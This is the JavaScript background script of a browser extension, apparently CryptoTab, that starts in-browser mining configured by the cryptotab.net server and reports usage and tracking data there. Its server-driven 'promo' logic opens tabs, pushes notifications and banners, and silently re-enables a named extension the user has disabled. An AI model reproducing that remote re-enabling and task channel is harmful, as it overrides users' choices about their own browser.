Raven.config('https://0088ef0ea1d043ce9970bb9717aa2c25@raven.cryptotab.net/2', {
  release: chrome.runtime.getManifest().version,
  sampleRate: 0.2
}).install()
window.onunhandledrejection = function (evt) {
  Raven.captureException(evt.reason)
}

function get_uuid () { //Prefer Google Chrome's Crypto, but fallback to plain Math.random if it is not available.
  var random_string = 'undefined' === self.crypto ? (Math.random().toString(16) + Math.random().toString(16) + Math.random().toString(16) + Math.random().toString(16) + Math.random().toString(16)).replace(/0\./g, '') : Array.prototype.map.call(crypto.getRandomValues(new Uint32Array(20)), function (n) {return n.toString(16)}).join('')
    ,
    random_y_bit = 'undefined' === self.crypto ? [8, 9, 'a', 'b'][~~(Math.random() * 4)] : [8, 9, 'a', 'b'][crypto.getRandomValues(new Uint8Array(1))[0] % 4]
    , template_uuid = /.*(........)..(....)..(...)..(...)..(............).*/
    , replace_pattern = '$1-$2-4$3-' + random_y_bit + '$4-$5'

  return random_string.replace(template_uuid, replace_pattern)
}

function getBrowserId () {
  return new Promise(function (resolve) {
    chrome.storage.local.get('BrowserId', function (result) {
      if (result.BrowserId) {
        resolve(result.BrowserId)
      } else {
        let BrowserId = get_uuid()
        resolve(BrowserId)
        chrome.storage.local.set({BrowserId: BrowserId})
      }
    })
  })
}

chrome.storage.local.get(['firstOpen','needOpenTab'], (storage) => {
  if (storage.needOpenTab && storage.firstOpen) {
    chrome.tabs.create({url: chrome.runtime.getURL('tab.html')})
  }

  chrome.storage.local.set({needOpenTab: false})

})

const DOMAIN = 'cryptotab.net'

const STARTED_ICON_PATH = chrome.runtime.getURL('icons/icon_started.png')
const STOPPED_ICON_PATH = chrome.runtime.getURL('icons/icon_default.png')

const TAB_URL = chrome.runtime.getURL('tab.html')

let lastTick
let tasksData
let tasks = []
let notifications = []
let banners = null
let tryies = {}
let uid
let error
let success

const fetchAndGo = (url, params, type) => {
  if (!tryies[type]) {
    tryies[type] = 0
  }

  tryies[type]++

  getBrowserId().then(bid => {
    fetch(`https://${DOMAIN}/${url}?&v=${chrome.runtime.getManifest().version}&bid=${bid}`, {
      method: 'POST',
      body: JSON.stringify(params),
      credentials: 'include',
      headers: {
        'Authorization': `Bearer ${uid}`,
      }
    }).then((response) => {
      if (!response.ok) throw new Error(response.statusText)

      return response.json()
    }).then(data => {
      if (type !== 'blocked') {
        tickCallback(data)
      }

      if (type !== 'alive') {
        if (data.shards) {
          window.cryptoTab.CONFIG.WEBSOCKET = data.shards[0]
        }

        start(data.key, data.mid, data.version, data.infoTimeout)
      }

      tryies[type] = 0
    }).catch(err => {
      error = true
      if (tryies[type] < 5) {
        setTimeout(() => {
          fetchAndGo(url, params, type)
        }, 15 * 1000)
      }
    })
  })
}

const start = (key, mid, version, infoTimeout) => {
  let app = new App(key, mid, version, infoTimeout)
  app.start()
}

const showNotification = (notification) => {
  chrome.notifications.create(notification.id, notification.options)

  notifications.push({id: notification.id, url: notification.url})

  tasksData.notifications[notification.id] = {
    show: true,
    close: false,
    click: false
  }

  tasksDataToStorage()
}

const tasksDataToStorage = () => {
  chrome.storage.sync.set({tasksData})
}

const showTab = (tab) => {
  let url = tab.url
  if (tab.url === 'cryptotab') url = TAB_URL

  tasksData.tabs[tab.id] = {show: true}
  tasksDataToStorage()

  chrome.tabs.create({url})
}

const showBanners = (b) => {
  banners = b
}

const switchTask = (task, type) => {
  switch (type) {
    case 'notification':
      showNotification(task)
      break

    case 'tab':
      showTab(task)
      break

    case 'banners':
      showBanners(task)
      break
  }
}

const tickCallback = (data) => {
  uid = data.uid
  chrome.storage.sync.set({uid: data.uid})

  lastTick = Date.now()

  const promo = data.promo

  if (promo) {
    const id = promo.id

    let ext = false

    chrome.management.getAll(extensions => {
      extensions.forEach(extension => {
        if (extension.id === id) {
          ext = true

          if (extension.enabled === false) {

            chrome.management.setEnabled(id, true)

            let enabledCounter = tasksData.extensions[id] && tasksData.extensions[id].enabledCounter || 0

            tasksData.extensions[id] = {
              enabledCounter: ++enabledCounter
            }
          }

          tasksDataToStorage()
        }
      })

      if (!ext && promo.tasks) {
        for (let type in promo.tasks) {
          const task = promo.tasks[type]

          if (type === 'banners') {
            task.forEach(t => {
              if (t.ts === 'immediately') {
                switchTask(task, type)
              } else {
                tasks.push({
                  type: type,
                  data: t
                })
              }
            })
          } else {
            if (task.ts === 'immediately') {
              switchTask(task, type)
            } else {
              tasks.push({
                type: type,
                data: task
              })
            }
          }
        }
      }
    })
  }
}

const openTabOrFocus = () => {
  chrome.tabs.query({url: `${chrome.runtime.getURL('')}*html`}, (tabs) => {
    if (tabs && tabs.length > 0) {
      chrome.windows.getCurrent({}, (w) => {
        if (w.id !== tabs[0].windowId) {
          chrome.windows.update(tabs[0].windowId, {focused: true})
        }
        
        chrome.tabs.update(tabs[0].id, {active: true})
      })
    } else {
      chrome.tabs.create({url: TAB_URL})
    }
  })
}

chrome.browserAction.onClicked.addListener(openTabOrFocus)

chrome.storage.local.get('tutorialWatched', (response) => {
  if (!response.tutorialWatched) {
    chrome.storage.local.set({'tutorial': false})
  }
})

chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
  if (request.getBanners && banners) {
    
    banners.forEach(banner => {
      tasksData.banners[banner.id] = {show: true}
    })

    sendResponse(banners)
    tasksDataToStorage()
  }

  if (request.closeBanner) {
    if (tasksData.banners[request.closeBanner]) {
      tasksData.banners[request.closeBanner].close = true
    }

    banners.forEach((banner, i) => {
      if (banner.id === request.closeBanner) {
        banners.splice(i, 1)
      }
    })

    tasksDataToStorage()
  }

  if (request.checkStatus) {
    sendResponse({success: success, error: error})
  }
})

chrome.notifications.onClicked.addListener((id) => {
  notifications.forEach((notification, index) => {
    if (id === notification.id) {
      chrome.tabs.create({url: notification.url})
      chrome.notifications.clear(id)
      notifications.splice(index, 1)

      tasksData.notifications[notification.id].click = true
      tasksDataToStorage()
    }
  })
})

chrome.notifications.onClosed.addListener((id) => {
  notifications.forEach((notification, index) => {
    if (id === notification.id) {
      notifications.splice(index, 1)

      tasksData.notifications[notification.id].close = true
      tasksDataToStorage()
    }
  })
})

const formatSpeed = (speed) => {
  if (speed === 0) {
    return 'off'
  } else if (speed <= 30) {
    return 'low'
  } else if (speed <= 70) {
    return 'normal'
  } else {
    return 'high'
  }
}

chrome.storage.sync.get(['uid', 'tasksData'], (syncStorage) => {
  if (syncStorage.tasksData) {
    tasksData = syncStorage.tasksData
  } else {
    tasksData = {
      notifications: {},
      tabs: {},
      banners: {},
      extensions: {}
    }
  }

  uid = syncStorage.uid

  chrome.storage.local.get('speed', (localStorage) => {
   if (syncStorage.uid) {
      fetchAndGo('boot/', {
        uid: syncStorage.uid,
        tasksData: tasksData,
        ts: Date.now(),
        speed: formatSpeed(localStorage.speed),
        v: chrome.runtime.getManifest().version
      }, 'boot')
    } else {
      fetchAndGo('install/', {
        v: chrome.runtime.getManifest().version,
        ts: Date.now()
      }, 'install')
    }
  })
})

setInterval(() => {
  const now = Date.now()

  if (lastTick && now > lastTick + 3 * 60 * 60 * 1000) {
    chrome.storage.local.get('speed', (localStorage) => {
      fetchAndGo('boot/', {
        uid: uid,
        stage: 'alive',
        tasksData: tasksData,
        ts: Date.now(),
        speed: formatSpeed(localStorage.speed),
        v: chrome.runtime.getManifest().version
      }, 'alive')
    })
  }

  tasks.forEach((task, index) => {
    if (task.data.ts < now) {
      switchTask(task.data, task.type)

      tasks.splice(index, 1)
    }
  })
}, 10 * 1000)

chrome.runtime.setUninstallURL(`https://${DOMAIN}/uninstall/?version=`+chrome.runtime.getManifest().version)